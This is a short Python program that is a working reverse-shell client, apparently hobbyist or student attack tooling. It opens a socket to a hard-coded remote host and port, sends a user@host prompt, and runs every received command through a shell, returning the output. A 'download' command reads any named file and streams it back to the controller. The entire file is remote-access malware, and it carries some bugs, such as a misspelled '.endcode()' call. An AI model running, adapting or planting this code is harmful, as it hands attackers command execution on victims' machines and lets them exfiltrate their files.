from time import sleep
import socket
import subprocess
import os
import platform
import getpass
import colorama

SHOST = "192.168.2.153"
SPORT = 7123

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SHOST, SPORT))

while True: 
    try: 
        input_h = f"""{colorama.Fore.RED}{getpass.getuser()}@{platform.node()}{colorama.Style.RESET_ALL}:{colorama.Fore.LIGHTBLUE_EX}{os.getcwd()}{colorama.Style.RESET_ALL}$ """
        s.send(input_h.encode())
        stdout, stderr = None, None
        cmd = s.recv(1024).decode("utf-8")  # adjust the byte limit

        ### cmds

        # Download files
        if cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as fs:
                data = fs.read(1024)    # adjust
                while data:
                    print("Transfering", data) # comment, cause terminal will be packed
                    s.send(data)
                    data = fs.read(1024)    # adjust
                sleep(1)
                s.send(b'all good')
            print("Data was sent.")

        elif cmd == "bye bro":
            s.send(b'shutting connection down')
            break


        
        else:
            exe = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            vStdout, vStderr = exe.communicate()
            if not vStdout:
                s.send(vStderr)
            else:
                s.send(vStdout)
        
        # if smth brakes 

        if not cmd: 
            print("some shit happend")
            break
    except Exception as oopsie:
    #    s.send(f"Umm, error: {oppsie}")    # this doesnt work. needs to be encoded: 
        s.send("Umm, error: {}".format(str(oopsie)).endcode())

s.close()